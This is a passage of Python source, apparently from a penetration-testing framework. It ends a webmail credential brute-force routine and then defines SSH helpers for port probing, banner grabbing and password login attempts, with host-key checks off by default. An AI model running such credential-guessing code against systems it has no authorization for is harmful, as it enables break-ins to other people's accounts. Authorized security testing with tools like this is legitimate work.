                        f"(— {self.auth_fail_count} auth failures, {self.error_count} errors) "
                        f"— no valid credentials found"
                    ),
                    severity=Severity.INFO,
                )
            )

        findings.append(
            self.finding(
                title="Webmail Attack Telemetry",
                description="Webmail credential brute force telemetry",
                severity=Severity.INFO,
                raw_data={
                    "auth_type":     "webmail",
                    "login_url":     login_url,
                    "attempts":      self.total_attempts,
                    "successes":     len(self.successes),
                    "auth_failures": self.auth_fail_count,
                    "timeouts":      self.timeout_count,
                    "rate_limits":   self.rate_limit_hits,
                    "refused":       self.refused_count,
                },
            )
        )

        await self.emit_event('INFO',
            f"\n[COMPLETE] "
            f"{self.total_attempts} attempts | "
            f"{len(self.successes)} successes"
        )

        return findings

    # =====================================================
    # SSH HELPERS
    # =====================================================

    async def _probe_port(self, host, port, timeout):
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=timeout,
            )
            writer.close()
            return True
        except Exception:
            return False

    async def _get_banner(self, host, port, timeout):
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=timeout,
            )
            banner = await asyncio.wait_for(reader.readline(), timeout=timeout)
            writer.close()
            return banner.decode(errors="replace").strip()
        except Exception:
            return ""

    async def _try_auth(
        self, host, port, username, password, timeout,
        verify_host_keys: bool = False,
        known_hosts_file: Optional[str] = None,
    ):
        """
        FIX #28: host-key verification is now explicit and controllable.

        - verify_host_keys=False (default): known_hosts=None, same permissive
          behaviour as before, but the caller (execute) now raises an
          explicit Finding documenting this for every scan run, instead of
          it being a silent, undocumented choice baked into this method.
        - verify_host_keys=True: requires known_hosts_file to be provided
          and uses it for strict host-key verification. A mismatch raises
          asyncssh.HostKeyNotVerifiable, which is surfaced as the distinct
          "hostkey_failed" result so operators can tell a real MITM/host-key
          rotation apart from a normal auth failure.
        """
        known_hosts_arg = None
        if verify_host_keys:
            if known_hosts_file:
                resolved_khf = os.path.abspath(known_hosts_file)
                known_hosts_arg = resolved_khf
            else:
                # verify_host_keys=True with no file given — fall back to
                # asyncssh's default (~/.ssh/known_hosts) rather than
                # silently disabling verification, since the operator
                # explicitly asked for verification.
                known_hosts_arg = ()  # asyncssh default: use system known_hosts

        try:
            conn = await asyncio.wait_for(
                asyncssh.connect(
                    host,
                    port=port,
                    username=username,
                    password=password,
                    known_hosts=known_hosts_arg,
                    connect_timeout=5,
                    login_timeout=10,
                    preferred_auth=[
                        "password",
                        "keyboard-interactive",
                    ],
                    kex_algs=[
                        "curve25519-sha256",
                        "curve25519-sha256@libssh.org",
                        "ecdh-sha2-nistp256",
                        "diffie-hellman-group14-sha256",
                        "diffie-hellman-group14-sha1",
                    ],
                    encryption_algs=[
                        "aes128-ctr",
                        "aes192-ctr",
                        "aes256-ctr",
                        "aes128-cbc",
                        "aes256-cbc",
                    ],
                    server_host_key_algs=[
                        "ssh-ed25519",
                        "ecdsa-sha2-nistp256",
                        "rsa-sha2-256",
                        "rsa-sha2-512",
                        "ssh-rsa",
                    ],
                ),
                timeout=15,
            )
            conn.close()
            return "success"

        except asyncssh.PermissionDenied:
            return "auth_failed"
        except ConnectionResetError:
            return "reset"
        except asyncssh.ConnectionLost:
            return "reset"
        except asyncio.TimeoutError:
            return "timeout"
        except ConnectionRefusedError:
            return "refused"
        except asyncssh.KeyExchangeFailed:
            return "kex_failed"
        except asyncssh.HostKeyNotVerifiable:
            return "hostkey_failed"
        except asyncssh.DisconnectError:
            return "disconnect"
        except Exception as e:
            err = str(e).lower()
            if "reset by peer"        in err: return "reset"
            if "connection lost"      in err: return "reset"
            if "too many connections" in err: return "rate_limited"
            if "host key"             in err: return "hostkey_failed"
            await self.emit_event('INFO', f"[ERROR] {e!r}")
            return "other"
        
        